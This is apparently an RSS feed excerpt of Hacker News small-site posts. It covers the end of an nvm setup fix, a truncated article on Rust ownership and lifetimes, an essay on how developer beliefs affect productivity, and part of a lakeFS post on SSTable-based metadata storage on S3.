<pre><code>. <span>"<span>$HOME</span>/.nvm/nvm.sh"</span>
</code></pre>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613911386360/z1n5BnhfS.png?auto=compress" alt="image.png"></p>
<p>Save the file <code>ctrl + s</code> and <code>ctrl + x</code> to exit</p>
<p>Restart your terminal, everything should work just fine now.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1613908634481/gY9CYLT1H.gif?auto=format,compress&amp;gif-q=60" alt="&quot;.gif"></p>
<p>See you soon!</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://iroleh.tech/nvm-not-found</link>
            <guid isPermaLink="false">hacker-news-small-sites-26213045</guid>
            <pubDate>Sun, 21 Feb 2021 12:38:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust Ownership from the Hard Way]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26213033">thread link</a>) | @yagizdegirmenci
<br/>
February 21, 2021 | https://chrismorgan.info/blog/rust-ownership-the-hard-way/ | <a href="https://web.archive.org/web/*/https://chrismorgan.info/blog/rust-ownership-the-hard-way/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article itemscope="" itemtype="http://schema.org/Article">

<p>This article is an introduction to Rust’s concept of ownership. It’s designed for someone who is already a programmer but who is not especially familiar (maybe even not at all familiar) with Rust. It doesn’t attempt to explain all the concepts it deals with, but for the most part it should be clear enough. If you’re a beginner you may also find that you don’t understand various parts of it; in such a case, you might like to hold the article while you go and learn more about them elsewhere; you’ll find more value in coming back to this article after.
</p><p>This concept of ownership is the pivotal part of Rust; it’s the part that makes its combination of efficiency and safety possible. While the rest of Rust is pretty similar to what you’ll find in <span><span>mainstream languages</span><span role="note"><span> [</span>OK, so pattern matching and algebraic data types aren’t widespread in C-style languages, but they’re conceptually simple.<span>]</span></span></span>, these concepts of ownership and lifetimes are different from anything in any mainstream language, so it’s likely to be the part that you’ll spend the longest trying to grok; if you don’t give up but persist, then when it all clicks, working in Rust will be a joy, and you’ll have unlocked a marvellous ability to reason about code. You’ll also probably wish you could transplant a lot of the aspects of Rust’s ownership model to other languages you deal with.<span><span></span><span role="note"><span> [</span>Seriously. The ownership model makes reasoning about many things <em>so</em> much easier, and I really <em>do</em> miss it when working in other languages.<span>]</span></span></span>
</p><p>This article deals with the concepts and theory of ownership and lifetimes; it doesn’t provide much in the way of practical usage examples; those you can find elsewhere. But it does explain all the rules that go to make Rust’s ownership model what it is. (It <em>is</em> called “the hard way” for a reason.)
</p><p>Well, on with the first of our four rules:
</p><h2 id="rule-one"><ol><li value="1">Each object can be used exactly once. When you use an object it is moved to the new location and is no longer usable in the old.</li></ol></h2>
<p><a href="#exceptions-to-single-use">Later on</a> we’ll deal with a couple of features that make this model more palatable, but for now we’ll skip them, considering it at the most basic level.
</p><figure><pre><code><b>struct</b> A;

<b>fn</b> main() {
    <b>let</b> a = A;
    <b>let</b> b = a;
    <b>let</b> c = a;
}
</code></pre></figure>
<!-- Output from rustc 1.38.0-nightly; omitted “unused variable” warnings and “For more information about this error, try `rustc --explain E0382`.” at the end. -->
<figure><pre><samp><b><span>error[E0382]</span>: use of moved value: `a`</b>
<b> --&gt;</b> &lt;anon&gt;:6:13
<b>  |</b>
<b>4 | </b>    let a = A;
<b>  |         - move occurs because `a` has type `A`, which does not implement the `Copy` trait</b>
<b>5 | </b>    let b = a;
<b>  |         - value moved here</b>
<b>6 | </b>    let c = a;
<b>  | </b>        <b>^ value used here after move</b>

<b><span>error</span>: aborting due to previous error</b></samp></pre></figure>
<p>The <code>A</code> instance placed in the slot <code>a</code> is moved to <code>b</code>, rendering <code>a</code> unusable.
</p><h2><ol><li value="2">When an object passes out of scope, it is destroyed and is no longer usable.</li></ol></h2>
<p>All curly braces (known as <em>blocks</em>) introduce a new level of scope, and anything declared inside a block (e.g. the binding <code>x</code> in <code><b>let</b> x = y;</code>) will live until the end of that block.
</p><figure><pre><code><b>struct</b> A;

<b>fn</b> main() {
    {
        <b>let</b> a = A;
    }
    <b>let</b> b = a;
}
</code></pre></figure>
<p>This example won’t work, because <code>a</code> has fallen out of scope and been destroyed by the time we try to assign it to <code>b</code>:
<!-- Output from rustc 1.38.0-nightly. Omitted “For more information about this error, try `rustc --explain E0425`.” at the end. -->
</p><figure><pre><samp><b><span>error[E0425]</span>: cannot find value `a` in this scope</b>
<b> --&gt;</b> &lt;anon&gt;:7:13
<b>  |</b>
<b>7 | </b>    let b = a;
<b>  | </b>            <b>^ help: a unit struct with a similar name exists: `A`</b>

<b><span>error</span>: aborting due to previous error</b></samp></pre></figure>

<p>When an object passes out of scope and is destroyed, if the type implements <a href="https://doc.rust-lang.org/std/ops/trait.Drop.html"><code>Drop</code></a>, that destructor will be run. I won’t get into the details of destructors here. Types like <code><b>&amp;</b>T</code> and <code><b>&amp;mut </b>T</code> (immutable and mutable references) do not have destructors.
</p><h2><ol><li value="3">Blocks can produce a value which goes up one level of scope.</li></ol></h2>
<p>As a language feature, this is typically known as <em>expression orientation</em>, as distinct from <em>statement orientation</em>. It’s a fairly simple concept and will seem perfectly natural to users of languages like Ruby, though to users of languages like C++ and Python it may seem a little odd. (I came originally from a Python background; at first I thought it a gimmick useful only for skipping the word <code><b>return</b></code> on the last statement of a function, but I rapidly discovered it isn’t a gimmick at all; it’s a very useful feature, for all that it wouldn’t suit a language like Python.)
</p><p>The main rule is simple: the last expression in a block is the value that the block produces. (A block is thus an expression too.) There are a couple of other rules to deal with the corner cases:
</p>
<ul>
    <li><p>An empty block produces <code>()</code> (<em>unit</em>).
	</p></li><li><p>If a block’s contents ends with a semicolon and the end of the block is reachable, the block produces <code>()</code>.
</p></li></ul>
<p>Here’s a simple example:
</p><figure><pre><code><b>let</b> a = {
    <i>// … do anything we like …</i>
    <span>1</span>
};
</code></pre></figure>
<p>Here, <code>a</code> ends up storing the value <code>1</code>. Given these rules, you can see that putting braces around an expression changes nothing, for at each added level the block contains only a single expression, which is then its own value. <span><span>Hence, <code><b>let</b> a = { { { { <span>1</span> } } } };</code> and <code><b>let</b> a = <span>1</span>;</code> are equivalent.</span><span role="note"><span> [</span>They’re actually not <em>quite</em> equivalent in general, for a block expression is an <em>rvalue</em>; thus <code>string[..].is_empty()</code> works, while <code>{&nbsp;string[..]&nbsp;}.is_empty()</code> doesn’t.<span>]</span></span></span>
</p><p>In languages without this feature, the only type of block that produces a value (if you’ll allow my sloppy terminology here) is a function; there, they have the <code><b>return</b></code> keyword to fill in this blank. (Rust also has the <code><b>return</b></code> keyword to make early return more convenient, but the language would work fine without it—​it’d just be harder to write some sorts of code.<!-- I’m not certain if this (that `return` could be removed without reducing the expressiveness of functions) is actually true at present, but I *think* that until SEME (single entry, multiple exit: non-lexical borrows) comes it is. Loops are the main uncertainty in my mind. -->)
</p><figure><pre><code><b>fn</b> foo_the_c_way() -&gt; <b>i32</b> {
    <b>return</b> <span>1</span>;
}

<b>fn</b> foo_the_rust_way() -&gt; <b>i32</b> {
    <span>1</span>
}</code></pre></figure>
<p>Because of this paradigm of expression orientation, the concept of special <span><span><em>ternary expressions</em></span><span role="note"><span> [</span><code>condition ? a : b</code> in most languages;<soft-br></soft-br> <code>a <b>if</b> condition <b>else</b> b</code> in Python.<span>]</span></span></span> is not necessary in Rust, for an <code><b>if</b></code> expression can do the job just fine:
</p><figure><pre><code><b>let</b> x = <b>if</b> a { b } <b>else</b> { c };

<b>let</b> x = <b>if</b> a {
    <i>// … do things …</i>
    b
} <b>else</b> {
    <i>// … do things …</i>
    c
};
</code></pre></figure>
<!-- And not having used ? for a ternary expression, Rust has been able to use it for something else from Rust 1.14 onwards. I might even put something in the article proper about it, if we decide on a good name for it and have documentation. Don’t seem to have anything in the current book about it. -->
<h2><ol><li value="4">All objects have a lifetime which constrains which scopes they may be moved out of.</li></ol></h2>
<p>Now we’re getting into the harder stuff, the biggest thing that’s unusual about Rust: lifetimes. Syntactically, a lifetime in Rust is any identifier with the prefix of a single quotation mark, e.g. <code><i>'a</i></code>. Any name will do for a lifetime, but there is one special lifetime, <code><b><i>'static</i></b></code>, which means that an object contains no non-static references. Most of the primitive types (<code><b>i32</b></code>, <code><b>bool</b></code>, <code><b>str</b></code>, <code>[T]</code>, <i>&amp;c.</i>) are static; those that are not are:
</p><ul>
	<li>Arrays (<code>[T; n]</code>) and slices (<code>[T]</code>) of non‐static types;
	</li><li>Tuples with non‐static members;
	</li><li>Non‐static references, <i>viz.</i> any <code><b>&amp;</b>T</code> or <code><b>&amp;mut</b> T</code> except <code><b>&amp;<i>'static</i></b> T</code> and <code><b>&amp;<i>'static</i> mut</b> T</code>.
</li></ul>

<h3>Lifetime positions in types</h3>
<p>There are four places where a lifetime can appear in a <em>type</em>:
</p><ul>
	<li><code><b>&amp;</b><i>'a</i> Type</code>: the lifetime of an immutable reference;
	</li><li><code><b>&amp;</b><i>'a</i> <b>mut</b> Type</code>: the lifetime of a mutable reference;
	</li><li><code>Type&lt;<i>'a</i>&gt;</code>: a generic lifetime parameter on a type;
	</li><li><code>Trait + <i>'a</i></code>: a trait object’s lifetime, as with generic bounds (dealt with below).
</li></ul>
<p>The first two are, I believe, fairly obvious; it’s clearly unsafe to have a reference to an object that has been freed. (By baking this into the language, we avoid the problem of <em>dangling pointers</em> that languages like C have.)
</p><p>The third is much the same, as all generic lifetime parameters will, somewhere down the way, be of one of the other types, and so it’s just a way of passing that constraint through the types, like this:
</p><figure><pre><code><b>struct</b> Ref&lt;<i>'a</i>, T: <i>'a</i>&gt;(<b>&amp;</b><i>'a</i> T);</code></pre></figure>
<p>As you can see, this <code>Ref</code> type is basically just a wrapper around an immutable reference; as the contained field is of that lifetime, clearly the containing structure may not live any longer than it and so it must have that lifetime also. (The <code>T: <i>'a</i></code> part is a type bound, saying that the generic type <code>T</code> must live for at least <code><i>'a</i></code>; without this it would not work, for as already discussed it clearly wouldn’t make sense to have a reference living longer than the object it refers to.)
</p><p>The fourth and final of these (<code>Trait + <i>'a</i></code>) is, I think, the most interesting, and it’s worth spending a short time on trait objects, because the way in which they fit into this arrangement is <em>slightly</em> different from elsewhere.
</p><p>Trait objects are Rust’s form of safe and convenient <em>dynamic dispatch</em>; they allow you to store arbitrary types that satisfy a trait in the one type. Because of the potential difference in size of the types implementing a trait, trait objects are only usable through a reference of some form; the owned form is thus <code><b>Box</b>&lt;Trait&gt;</code>, and for references you can have <code><b>&amp;</b>Trait</code> and <code><b>&amp;mut</b> Trait</code>. This is a very brief and wholly lacking explanation of trait objects; you can find documentation of them elsewhere; a detailed explanation is out of scope<!-- ha! --> for this article.
</p><p>As stated, a trait object may be of a variety of different types; what, then, is the lifetime of a trait object? The answer is that we must specify it, like <code><b>Box</b>&lt;Trait + <b><i>'static</i></b>&gt;</code>, indicating that the contained object must be <code><b><i>'static</i></b></code>, and <code><b>&amp;</b><i>'a</i> (Trait + <i>'a</i>)</code>, indicating that the contained object’s lifetime must be at least <code><i>'a</i></code>. Now as it happens, some of these common cases like <code>+ <b><i>'static</i></b></code> on a boxed trait object and the duplication of the <code><i>'a</i></code> in the reference are taken care of as default trait bounds—​<code><b>Box</b>&lt;Trait&gt;</code> is normally equivalent to <code><b>Box</b>&lt;Trait + <b><i>'static</i></b>&gt;</code> and <code><b>&amp;</b><i>'a</i> Trait</code> to <code><b>&amp;</b><i>'a</i> (Trait + <i>'a</i>)</code>. <a href="https://github.com/rust-lang/rfcs/blob/master/text/0599-default-object-bound.md">RFC 599, on default object bounds</a>, treats the current rules on this subject more precisely.
</p><p>(Note that just as the lifetime on a trait object can be omitted due to <em>default object bounds</em>, lifetimes on the other three cases can also often be omitted; the current rules of lifetime elision are covered in <a href="https://github.com/rust-lang/rfcs/blob/master/text/0141-lifetime-elision.md">RFC 141</a>.)
</p><p>But still you may wonder: why do trait object need a lifetime? I think it’s easiest to just give an example of something that would be bad if it were allowed to compile (<a href="https://play.rust-lang.org/?code=fn%20main()%20%7B%0A%20%20%20%20let%20trait_object:%20%26AsRef%3Cstr%3E%20%3D%20%7B%0A%20%20%20%20%20%20%20%20let%20string%20%3D%20%22I%20am%20a%20String%22.to_owned();%0A%20%20%20%20%20%20%20%20%26string%0A%20%20%20%20};%0A%20%20%20%20println!(%22The%20string%20is%20{:?}%22%2C%20trait_object.as_ref());%0A}">which it isn’t</a>):
</p><figure><pre><code><b>fn</b> main() {
    <b>let</b> trait_object: <b>&amp;</b>AsRef&lt;<b>str</b>&gt; = {
        <b>let</b> string = <span>"I am a String"</span>.to_owned();
        <b>&amp;</b>string
    };
    <i>println!</i>(<span>"The string is <b>{:?}</b>"</span>, trait_object.as_ref());
}
</code></pre></figure>
<p>By the time execution gets to the <code><i>println!</i></code> statement, <code>string</code> has been freed, so if this were allowed to compile, <code>trait_object</code>, which points to the contents of <code>string</code>, would also thus be pointing to …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chrismorgan.info/blog/rust-ownership-the-hard-way/">https://chrismorgan.info/blog/rust-ownership-the-hard-way/</a></em></p>]]>
            </description>
            <link>https://chrismorgan.info/blog/rust-ownership-the-hard-way/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26213033</guid>
            <pubDate>Sun, 21 Feb 2021 12:34:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Increase your long term productivity by reassessing your beliefs]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26212885">thread link</a>) | @pedrogrande
<br/>
February 21, 2021 | https://www.good-input.net/Blog/Post/Increase-your-long-term-productivity-by-reassessing-beliefs | <a href="https://web.archive.org/web/*/https://www.good-input.net/Blog/Post/Increase-your-long-term-productivity-by-reassessing-beliefs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
<blockquote>
<p>Belief in the context of this article is free of any spiritual or religious meaning.</p>
</blockquote>
<p>This article's idea is inspired by a <a href="https://www.reddit.com/r/Blazor/comments/l89iit/blazor_server_logging_from_service/">reddit thread</a>, I participated. The specific topic is not relevant but the reactions of one group of people, started by the statement.</p>
<blockquote>
<p>Making a service static is the worst idea you could've possibly done.</p>
</blockquote>
<p><img src="https://res.cloudinary.com/good-input/image/upload/v1612804592/beliefs-and-long-term-productivity/discussion-reddit-self-afirming-beliefs_slgdnq.jpg" alt="screenshot of the Reddit discussion"></p>
<p>If someone is asking why to understand a matter, like in this thread, such a response isn't helpful. It is not an explanation; instead, it is a statement of a belief. It is "so" evident (to them) that a proper explanation is not needed anymore.  Others could have demanded a reason, but more remarkable, they kicked off a self-affirmation loop.</p>
<p>It is a behavior that I didn't expect to see in professional-focused discussions, especially not around us developers. I was curious. Is this an exception, or is it a habitual action? I found an overwhelming amount of debates (online and offline) with these recurrent patterns.</p>
<p>But why should we care about it? Why should we care that debates are turning this way?</p>
<p>Why is the presented quota a statement of belief? And why have beliefs an impact on our productivity? One of the text's central argument is that beliefs are a simplification of reality.</p>
<p>They are not inherently bad. The most professional beliefs we have are not something like believing that <a href="https://www.washingtonpost.com/politics/a-glance-at-rep-marjorie-taylor-greenes-incendiary-words/2021/02/04/b0748070-6745-11eb-bab8-707f8769d785_story.html#google_ads_iframe_/701/wpni.politics_4:%7E:text=SPACE%20LASERS">a secret Jewish space laser silence the advocates for functional programming</a>, and hence, it not a mainstream thing. Our professional beliefs are definitely not as deranged, although the impacts of beliefs in software development are severe too.  On the individual level, the person is missing a learning opportunity and hence facing a productivity loss. That is an argument we examine in this article. However, this personal effect is accelerated by peer dynamic, resulting in teams or even organizational level to a denial of facts. One of the multiple reasons the solar wind hack has been possible was <a href="https://thenewstack.io/solarwinds-the-worlds-biggest-security-failure-and-open-sources-better-answer/#13865249:%7E:text=Ironically%2C%20SolarWinds%20claimed%20open%20source%20software,can%20infect%20it%20with%20malicious%20code">the belief that security through obscurity works and open discussion about security hinders a successful implementation</a>.</p>
<p>It is a long path to understand the effects of beliefs on your productivity, but it's worth it. Being open to new ideas is one of the best ways to have sustainable productivity: once that is stable today and tomorrow.</p>
<h2>Beliefs as a simplification of a complex reality</h2>
<p>Metaphysics is a branch inside the philosophy that developed concepts around reality. As with many other social sciences, there are conflicting points of view, heated debates, and sometimes delicious humor around reality.</p>
<p><img src="https://res.cloudinary.com/good-input/image/upload/v1612804930/beliefs-and-long-term-productivity/meme-tree-falls-in-forest_mftuft.jpg" alt="Meme about a tree is falling in the forest"></p>
<p>That people can live in different realities doesn't only become evident after the US 2020 election but also for people living with others suffering from mental illnesses like schizophrenia.</p>
<p>Reality is the objective truth of things, in all of its complexity and known and unknown relationships.  Reality doesn't need to be recognized to exist. For instance, the electric current is real (and measurable), whether you choose to plug in your device or not. Deregulating banks and the finance sector to create wealth for everyone is not reality because its sole existence is based on humans' minds choosing to follow this narrative. It wouldn't exist if humans didn't exist.</p>
<p>However, based on our limited sensory and intellectual capacity, we, as humans, can only perceive a fraction of reality at a time. We experience reality, and this experience is subjective. Very often, humans confuse this experience with reality itself.  As mentioned earlier, some mental illnesses prove that point. Patients see things we don't recognize. They hear voices we can't listen to. For them, what they experienced is real.  Thoughts of deep trauma can be experienced as authentic now, even if the occurrence lies years in the past.</p>
<p>Multiple past experiences are combined - sometimes more melted -  into a theory. A theory is an explanation of <em>how reality is</em> in a particular circumstance. Theories are the foundation for <em>judgments</em>. Judgment is the anticipation of a theory coming true. If judgments have been proven "right" enough times, they become a <strong>belief</strong>.</p>
<p>Toddlers are representing excellent examples of incorporating multiple experiences into a theory. Imagine a scenario where various toys have been given to a kid. Let's say green and red ones. The red toys make sounds and the green ones don't. After a couple of tries, their brains combine the experience of reality (red) with another experience of reality (make sounds when shaking) and create the theory that red toys make sounds. After enough tries, they started the judgment that they need to interact with red ones if they want to hear a sound.  If more toys with different colors are added and don't make a sound, the toddler created a belief: Only red toys make a sound.</p>
<p><img src="https://res.cloudinary.com/good-input/image/upload/v1612804959/beliefs-and-long-term-productivity/kids-believes-only-red-toys-make-a-sound_uzoo8n.jpg" alt="After trying different toys, a child creates the belief that red toys make a sound"></p>
<p>With our experience (because we experience many contradicting examples), we can easily see that there is no correlation between the color of a toy and its ability to make a sound. But for them, this belief drives their behavior.</p>
<p>Beliefs are a necessity. Without beliefs, we would be overwhelmed with the infinite complexity of reality. Literally, we couldn't survive a day. Going back to the toddler example and imagine a situation where there are multiple toys, and the toddler wants to hear a sound. Believing (as a result of experience) that red toys make a sound is incredibly beneficial in this circumstance because they can "safely" ignore all other toys.</p>
<p><strong>Beliefs are a simplifications of reality, a model, and not reality itself.</strong></p>
<p>Based on that, we can visualize a reality funnel. Each level is a simplification of the class before.</p>
<p><img src="https://res.cloudinary.com/good-input/image/upload/v1612805033/beliefs-and-long-term-productivity/the-belief-funnel_anvasy.jpg" alt="The reality funnel as a filter system to handle the infinity complexity of reality"></p>
<h2>Software development is complex enough so that an individual is unable to know the system entirely</h2>
<p>While the section before talked about reality as the foundation, I want to show that the same mechanism applies to non-natural systems too. Modern software development (maybe starting 20 years back) is so complex that it can't be understood fully. You can't possibly know all the implications of your source code or knowing all the side effects. It is not as complex as reality itself, but in its whole, it is unknowable.  I want to call this a <strong>meta-reality</strong>.</p>
<p>Indeed, most of the time, we experience this meta-reality not using our senses but through a thought based feedback process. It can be a debugger, indicated which control path a program goes. It can be logging at a console or LEDs turning on and off.  My personal best example is creating a layout in HTML with Bootstrap, something I haven't understood fully. Usually, I apply classes to certain elements and hope that they arrange in a way I want them to.</p>
<p>These examples have in common that we create an input (our source code) and experience the result. Based on that experience, we make a theory about how the meta-reality works. Because we can't easily sense this kind of reality, the experience (or should I say beliefs) of other individuals become more vital in the construction of our theories, judgments, and beliefs.</p>
<p>For instance - before we have even experience with classes - we can just by reading, listening, and watching incorporate the theory that classes are beneficial to structure code and separating concerns. The massive amount of different available sources give their theory the needed credibility to evolve into a judgment. It is important to note that this judgment could be created before you write your code for the first time. In the end, the belief that classes are the only way to structure your code is created.</p>
<p>In the meta-reality, beliefs have the same function: Reducing complexity and make choices easier. Instead of thinking about the best approach to structure code, the belief kicks in, and you choose classes within seconds. (This leads to the next belief about finding the perfect name. :wink: )</p>
<p><img src="https://res.cloudinary.com/good-input/image/upload/v1612805207/beliefs-and-long-term-productivity/classes-as-the-best-way-to-structure-code_dbs2u7.png" alt="Based on beliefs, classes are the only option to structure source code"></p>
<h2>Once created, a belief can stick for a long time</h2>
<p>Creating a belief is a thought and input-intensive process. Once created, most persons tend to protect their investment and shield their beliefs from contradicting experiences. Either they don't pay attention to new experiences by trying out different ways, or they don't listen to people with conflicting opinions. The situation is worsening, with our human tendency to group with people having the same beliefs. Once we are a member of a group, we protect the group. Regarding beliefs, this tendency can create the self-assuring loops seen in the Reddit thread (and so much more).</p>
<p>Another approach to structure code is functional programming. I'm not advocating for one over the other. You can hardly find people that are doing (and enjoying) both: functional and object-orientated programming. Object orientation is widely mainstream. So programmers feel less concerned in paying attention to non OOP approaches. While functional programmers, a minority, need to stick together even more. So evidence that OOP could be beneficial, at least in some cases, are dropped. In the end, you have to pick a side: Either you doing OOP or functional programming. But isn't that too simple?</p>
<h2>Sticking to beliefs drops long term productivity</h2>
<p>In reality - likewise in meta-reality - change is constant. In reality, though, it is easier to sense it. Hence contradicting experiences can more quickly emerge and lead to a shift in a theory, judgment, and eventually belief.</p>
<p>I'd argue that since (western) nations experience climate change in their daily lives more severely (new experience), it changes the way they experience reality. This alteration leads to hopefully and eventually new beliefs. Using fossil fuels has a severe downside and is not an investment option for the future, which is now a common belief in society.</p>
<p>The sensing in the meta-reality is much, much more complicated. There are incidents so evident that ignoring is practically impossible, like broken builds due to now obsolete calls to APIs. The relationship between cause and effect can easily be spotted, which shortened the feedback loop tremendously. It …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.good-input.net/Blog/Post/Increase-your-long-term-productivity-by-reassessing-beliefs">https://www.good-input.net/Blog/Post/Increase-your-long-term-productivity-by-reassessing-beliefs</a></em></p>]]>
            </description>
            <link>https://www.good-input.net/Blog/Post/Increase-your-long-term-productivity-by-reassessing-beliefs</link>
            <guid isPermaLink="false">hacker-news-small-sites-26212885</guid>
            <pubDate>Sun, 21 Feb 2021 12:09:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SSTables on S3: Scaling the Git Model to Petabyte-Scale Data Lakes]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26212772">thread link</a>) | @ozkatz
<br/>
February 21, 2021 | https://lakefs.io/concrete-graveler-committing-data-to-pebbledb-sstables/ | <a href="https://web.archive.org/web/*/https://lakefs.io/concrete-graveler-committing-data-to-pebbledb-sstables/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1405" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">

	
<div>

    <div itemprop="text">

        
        




<h2 id="h-introduction">Introduction</h2>



<p>In our <a href="https://github.com/treeverse/lakeFS/releases/tag/v0.30.0">recent version of lakeFS</a>, we switched to base <a href="https://docs.google.com/document/u/0/d/1jzD7-jun-tdU5BGapmnMBe9ovSzBvTNjXCcVztV07A4/edit">metadata storage on immutable files stored on S3</a> and other common object stores.&nbsp; Our design is inspired by Git, but for object stores rather than filesystems, and with (much) larger repositories holding machine-generated commits. The design document is informative but by nature omits much of the reasoning behind it.&nbsp; This is (hopefully) the first in a series of posts that dive deeply into the details and rationale behind it.&nbsp; It discusses <em>why</em> the graveler 2-level storage design is useful for the immutable key-value store needed, and <em>how</em> we benchmarked in order to choose its parameters to get good caching of data from S3.&nbsp; Future posts will discuss why we specifically chose the <a href="https://rocksdb.org/">RocksDB SSTable file <em>format</em></a> and its <em>implementation</em> using the <a href="https://github.com/cockroachdb/pebble/">Pebble SSTable library from CockroachDB</a>.</p>



<p>The new design for committed storage, in brief:</p>



<ul><li>A <em>commit</em> combines some commit metadata with a list of all its stored named objects.</li><li>This list is stored in an immutable key-value format termed <em>graveler</em>.</li><li>A <a href="https://docs.google.com/document/d/1jzD7-jun-tdU5BGapmnMBe9ovSzBvTNjXCcVztV07A4/edit#bookmark=id.nvxia26m6klf"><em>graveler</em> key-value store</a> is an SSTable mapping keys (lakeFS pathnames) to values (object S3 URLs with some per-object metadata).</li><li>This SSTable is split across multiple S3 objects, each holding a <em>range</em> — an SSTable of contiguous key-value pairs.</li><li>Each range has an ID, and the list of ranges is stored in a <em>metarange</em> — an SSTable of IDs of range, keyed by that last key in each range.</li></ul>



<p>In essence this is a B+Tree of height 2.</p>



<div><figure><img loading="lazy" src="https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1.png" data-src="https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1.png" alt="PebbleDB SSTable" width="524" height="345" data-srcset="https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1.png 811w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1-300x198.png 300w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1-768x507.png 768w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1-24x16.png 24w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1-36x24.png 36w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1-48x32.png 48w" data-sizes="(max-width: 524px) 100vw, 524px" srcset="https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1.png 811w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1-300x198.png 300w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1-768x507.png 768w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1-24x16.png 24w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1-36x24.png 36w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-1-48x32.png 48w"></figure></div>



<p>We think this is a great top-level design!&nbsp; It…</p>



<ul><li>transfers a successful architecture for solving a similar problem (git) to our domain;</li><li>arranges standard building blocks, such as SSTables and object-store objects, in well-understood patterns;</li><li> uses immutability to allow for reproducibility and concurrency.</li></ul>



<p>But it has many knobs, and it leaves many low-level decisions open.</p>



<h2>Outline of graveler</h2>



<p>We store committed data in <em>graveler</em>.&nbsp; A commit in both Git and lakeFS is a binding of specific versions of the objects (files) in that commit with some additional <em>commit metadata</em> – such as parent commit IDs, commit message, author, user metadata.&nbsp; Actual versions of objects – the “data” – are stored on underlying object storage (typically S3); for our purposes here with an arbitrary path.&nbsp; graveler is our system that maps object paths in a specific revision to the object paths on underlying storage.</p>



<div><figure><img loading="lazy" width="953" height="676" src="https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed.png" data-src="https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed.png" alt="Graveler 2 revisions" data-srcset="https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed.png 953w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-300x213.png 300w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-768x545.png 768w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-24x17.png 24w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-36x26.png 36w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-48x34.png 48w" data-sizes="(max-width: 953px) 100vw, 953px" srcset="https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed.png 953w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-300x213.png 300w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-768x545.png 768w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-24x17.png 24w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-36x26.png 36w, https://lakefs.io/wp-content/uploads/2021/02/imageLikeEmbed-48x34.png 48w"></figure></div>



<p>This example shows graveler holding 2 revisions.&nbsp; File “a/file” <em>changes</em> between revisions, file “a/nother” is deleted, file “be/good” is renamed to “bat/man”, and file “be/tter” remains unchanged.&nbsp; The object names on underlying storage are immaterial to graveler.&nbsp; Additionally, because lakeFS is a versioned object store, it has no direct concept of “directories”: files are attached to paths.&nbsp; Splitting on separator characters (typically “/”) occurs at a higher level; graveler need merely provide an efficient “seek until &gt;=” operation.</p>



<p>Just as in Git, <em>commits never change</em>.&nbsp; So graveler is an immutable key-value store, that behaves as a large SSTable.&nbsp; However, the design of graveler faces some different forces from that of Git:</p>



<ul><li>graveler must be able to hold many more paths.&nbsp; A repository with merely millions of paths is <em>small</em>.&nbsp;</li><li>graveler uses a remote underlying storage.&nbsp; Remote files are fetched using the tiered filing system described in a previous blog post, “<a href="https://lakefs.io/tiers-in-the-cloud-how-lakefs-caches-immutable-data-on-local-disk/">Tiers in the Cloud: How lakeFS caches immutable data on local-disk</a>”.&nbsp; But access to any object that is not cached locally is <em>slow</em>, and random access is only an option after successfully retrieving the entire object.</li></ul>



<p>This leads to different implementation choices.</p>



<h2>Metadata object sizes</h2>



<p>A lakeFS repository uses the underlying storage for two different tasks:</p>



<ol><li>Storing <em>user</em> data objects.&nbsp; The number and size of these objects is controlled by the user, and an efficient workload already controls these parameters to allow efficient operation on the underlying storage.</li><li>Storing <em>metadata</em> objects.&nbsp; lakeFS controls the number and size of these objects, and must do so efficiently.</li></ol>



<p>lakeFS has multiple typical access patterns to committed data:</p>



